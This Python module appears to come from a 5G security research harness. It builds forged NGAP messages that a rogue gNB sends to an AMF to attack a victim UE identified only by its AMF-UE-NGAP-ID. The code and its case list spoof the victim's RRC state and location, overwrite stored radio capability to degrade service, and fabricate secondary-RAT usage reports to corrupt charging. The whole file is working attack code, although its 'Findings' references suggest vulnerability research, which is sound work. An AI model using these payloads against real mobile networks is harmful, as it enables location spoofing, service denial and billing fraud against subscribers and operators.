"""Cross-gNB NGAP attack cases for report/indication messages p10..p14.

These five UE-associated messages (HANDOVER SUCCESS, RRC INACTIVE TRANSITION
REPORT, UE RADIO CAPABILITY INFO INDICATION, SECONDARY RAT DATA USAGE REPORT,
LOCATION REPORT) are all NG-RAN -> AMF and locate the UE by AMF-UE-NGAP-ID.
None of them exists in builders.py, so every builder is NEW and lives here.
We reuse builders.py helpers (encode_plmn, _uli_nr, ip_to_bits, ...) but do NOT
edit that file.

Procedure codes / IE ids from TS 38.413 (ngap-r16.7.0 / 38413-g70.asn):

  msg                              procCode   protocol IEs (id: type [criticality])
  HandoverSuccess                  61         10 AMF-UE-NGAP-ID[reject], 85 RAN-UE-NGAP-ID[reject]
  RRCInactiveTransitionReport      37         10[reject], 85[reject], 92 RRCState[ignore],
                                              121 UserLocationInformation[ignore]
  UERadioCapabilityInfoIndication  44         10[reject], 85[reject], 117 UERadioCapability[ignore],
                                              118 UERadioCapabilityForPaging[ignore, optional]
  SecondaryRATDataUsageReport      52         10[ignore], 85[ignore],
                                              142 PDUSessionResourceSecondaryRATUsageList[ignore],
                                              143 HandoverFlag[ignore, optional],
                                              121 UserLocationInformation[ignore, optional]
  LocationReport                   18         10[reject], 85[reject], 121 UserLocationInformation[ignore],
                                              116 UEPresenceInAreaOfInterestList[ignore, optional],
                                              33 LocationReportingRequestType[ignore]

Opaque containers (UERadioCapability, secondaryRATDataUsageReportTransfer) are
sent as minimal valid placeholder OCTET STRINGs, mirroring how builders.py
handles opaque containers -- the point is to drive the (missing) sender binding,
not to carry meaningful RRC/usage payloads.
"""
from __future__ import annotations

from . import builders as B, ngap


CFG = {"mcc": "001", "mnc": "01", "tac": 1, "sst": 1, "sd": "010203",
       "gnb_id": 4660, "gnb_id_len": 32, "nci": 17}


# ---------------------------------------------------------------- NEW builders
def handover_success(amf_ue_id: int, ran_ue_id: int):
    """HANDOVER SUCCESS (procCode 61). Direction in the standard is AMF -> source
    NG-RAN node, so a gNB -> AMF instance is a *negative/direction-confusion* probe:
    a correct AMF has no inbound handler and must reject/ignore. Included to
    catch non-standard AMFs that mistakenly treat it as an early-success trigger."""
    ies = [
        {"id": 10, "criticality": "reject", "value": ("AMF-UE-NGAP-ID", amf_ue_id)},
        {"id": 85, "criticality": "reject", "value": ("RAN-UE-NGAP-ID", ran_ue_id)},
    ]
    return ("initiatingMessage", {
        "procedureCode": 61, "criticality": "reject",
        "value": ("HandoverSuccess", {"protocolIEs": ies}),
    })


def rrc_inactive_transition_report(amf_ue_id: int, ran_ue_id: int, cfg: dict, *,
                                   rrc_state: str = "connected",
                                   nci: int | None = None):
    """RRC INACTIVE TRANSITION REPORT (procCode 37). Class 2, no response.

    Forges the AMF's RRC-state + stored ULI view for a victim located only by
    AMF-UE-NGAP-ID (Findings A/B). rrc_state in {'inactive','connected'};
    the ULI is the cell/TAI the attacker claims for the victim."""
    ies = [
        {"id": 10, "criticality": "reject", "value": ("AMF-UE-NGAP-ID", amf_ue_id)},
        {"id": 85, "criticality": "reject", "value": ("RAN-UE-NGAP-ID", ran_ue_id)},
        {"id": 92, "criticality": "ignore", "value": ("RRCState", rrc_state)},
        {"id": 121, "criticality": "ignore",
         "value": ("UserLocationInformation", B._uli_nr(cfg, nci))},
    ]
    return ("initiatingMessage", {
        "procedureCode": 37, "criticality": "ignore",
        "value": ("RRCInactiveTransitionReport", {"protocolIEs": ies}),
    })


def ue_radio_capability_info_indication(amf_ue_id: int, ran_ue_id: int, *,
                                        ue_radio_capability: bytes = b"\x00",
                                        include_paging_cap: bool = False,
                                        paging_cap_nr: bytes = b"\x00"):
    """UE RADIO CAPABILITY INFO INDICATION (procCode 44). Class 2, no response.

    Overwrites the AMF's stored UE Radio Capability for a remote victim with an
    attacker-chosen opaque container (Finding A). With include_paging_cap the
    optional UE Radio Capability for Paging IE is poisoned too (Finding B)."""
    ies = [
        {"id": 10, "criticality": "reject", "value": ("AMF-UE-NGAP-ID", amf_ue_id)},
        {"id": 85, "criticality": "reject", "value": ("RAN-UE-NGAP-ID", ran_ue_id)},
        {"id": 117, "criticality": "ignore",
         "value": ("UERadioCapability", ue_radio_capability)},
    ]
    if include_paging_cap:
        ies.append({"id": 118, "criticality": "ignore",
                    "value": ("UERadioCapabilityForPaging",
                              {"uERadioCapabilityForPagingOfNR": paging_cap_nr})})
    return ("initiatingMessage", {
        "procedureCode": 44, "criticality": "reject",
        "value": ("UERadioCapabilityInfoIndication", {"protocolIEs": ies}),
    })


def _secondary_rat_usage_item(pdu_session_id: int):
    """PDUSessionResourceSecondaryRATUsageItem: victim PDU session id + an opaque
    (minimal, valid) secondaryRATDataUsageReportTransfer OCTET STRING."""
    transfer = ngap.encode_transfer("SecondaryRATDataUsageReportTransfer", {})
    return {"pDUSessionID": int(pdu_session_id),
            "secondaryRATDataUsageReportTransfer": transfer}


def secondary_rat_data_usage_report(amf_ue_id: int, ran_ue_id: int, cfg: dict, *,
                                    pdu_sessions=(1,), handover_flag: bool = False,
                                    include_uli: bool = False,
                                    nci: int | None = None):
    """SECONDARY RAT DATA USAGE REPORT (procCode 52). Class 2, no response.

    Fabricates secondary-RAT usage for a victim's PDU session(s); the AMF (confused
    deputy) forwards it to the victim's SMF/CHF, corrupting charging (Finding A).
    handover_flag sets the optional HandoverFlag; include_uli attaches a forged
    ULI (both optional IEs)."""
    usage_list = [_secondary_rat_usage_item(p) for p in pdu_sessions]
    ies = [
        {"id": 10, "criticality": "ignore", "value": ("AMF-UE-NGAP-ID", amf_ue_id)},
        {"id": 85, "criticality": "ignore", "value": ("RAN-UE-NGAP-ID", ran_ue_id)},
        {"id": 142, "criticality": "ignore",
         "value": ("PDUSessionResourceSecondaryRATUsageList", usage_list)},
    ]
    if handover_flag:
        ies.append({"id": 143, "criticality": "ignore",
                    "value": ("HandoverFlag", "handover-preparation")})
    if include_uli:
        ies.append({"id": 121, "criticality": "ignore",
                    "value": ("UserLocationInformation", B._uli_nr(cfg, nci))})
    return ("initiatingMessage", {
        "procedureCode": 52, "criticality": "ignore",
        "value": ("SecondaryRATDataUsageReport", {"protocolIEs": ies}),
    })


def location_report(amf_ue_id: int, ran_ue_id: int, cfg: dict, *,
                    nci: int | None = None, event_type: str = "direct",
                    report_area: str = "cell", aoi_presence: str | None = None,
                    aoi_ref_id: int = 1):
    """LOCATION REPORT (procCode 18). Class 2, no response.

    Spoofs the AMF's stored location for a remote victim (Finding A): the ULI is the
    attacker-claimed TAI/CGI. When aoi_presence in {'in','out','unknown'} the
    optional UEPresenceInAreaOfInterestList forges an Area-of-Interest event
    (Finding B) and event_type should be 'ue-presence-in-area-of-interest'."""
    ies = [
        {"id": 10, "criticality": "reject", "value": ("AMF-UE-NGAP-ID", amf_ue_id)},
        {"id": 85, "criticality": "reject", "value": ("RAN-UE-NGAP-ID", ran_ue_id)},
        {"id": 121, "criticality": "ignore",
         "value": ("UserLocationInformation", B._uli_nr(cfg, nci))},
    ]
    if aoi_presence is not None:
        ies.append({"id": 116, "criticality": "ignore",
                    "value": ("UEPresenceInAreaOfInterestList",
                              [{"locationReportingReferenceID": int(aoi_ref_id),
                                "uEPresence": aoi_presence}])})
    ies.append({"id": 33, "criticality": "ignore",
                "value": ("LocationReportingRequestType",
                          {"eventType": event_type, "reportArea": report_area})})
    return ("initiatingMessage", {
        "procedureCode": 18, "criticality": "ignore",
        "value": ("LocationReport", {"protocolIEs": ies}),
    })


# ---------------------------------------------------------------- cases
# Victim identifiers are placeholders (attacker-supplied at run time):
#   AMF-UE-NGAP-ID = victim AMF-side context id; RAN-UE-NGAP-ID = attacker-chosen.
V_AMF = 2         # victim AMF-UE-NGAP-ID (enumerated / observed)
V_RAN = 0xBADC0DE  # attacker-chosen RAN-UE-NGAP-ID (should be validated, assumed not)

CASES = [
    # p10 HandoverSuccess dropped: AMF->gNB direction (negative/no inbound handler).
    {"id": "p11-a", "msg": "RRCInactiveTransitionReport",
     "desc": "Forge RRC State for a remote victim to corrupt the AMF reachability/paging view.",
     "build": lambda cfg: rrc_inactive_transition_report(V_AMF, V_RAN, cfg,
                                                         rrc_state="connected")},
    {"id": "p12-a", "msg": "UERadioCapabilityInfoIndication",
     "desc": "Overwrite the victim's stored UE Radio Capability -> degraded/failed remote service.",
     "build": lambda cfg: ue_radio_capability_info_indication(V_AMF, V_RAN,
                                                              ue_radio_capability=b"\x00")},
    {"id": "p13-a", "msg": "SecondaryRATDataUsageReport",
     "desc": "Fabricated secondary-RAT usage for a victim session -> corrupt charging/CDR.",
     "build": lambda cfg: secondary_rat_data_usage_report(V_AMF, V_RAN, cfg,
                                                          pdu_sessions=(1,))},
    {"id": "p14-a", "msg": "LocationReport",
     "desc": "Spoof a remote victim's AMF-stored location (attacker TAI/CGI via ULI).",
     "build": lambda cfg: location_report(V_AMF, V_RAN, cfg, nci=0x999,
                                          event_type="direct")},
]
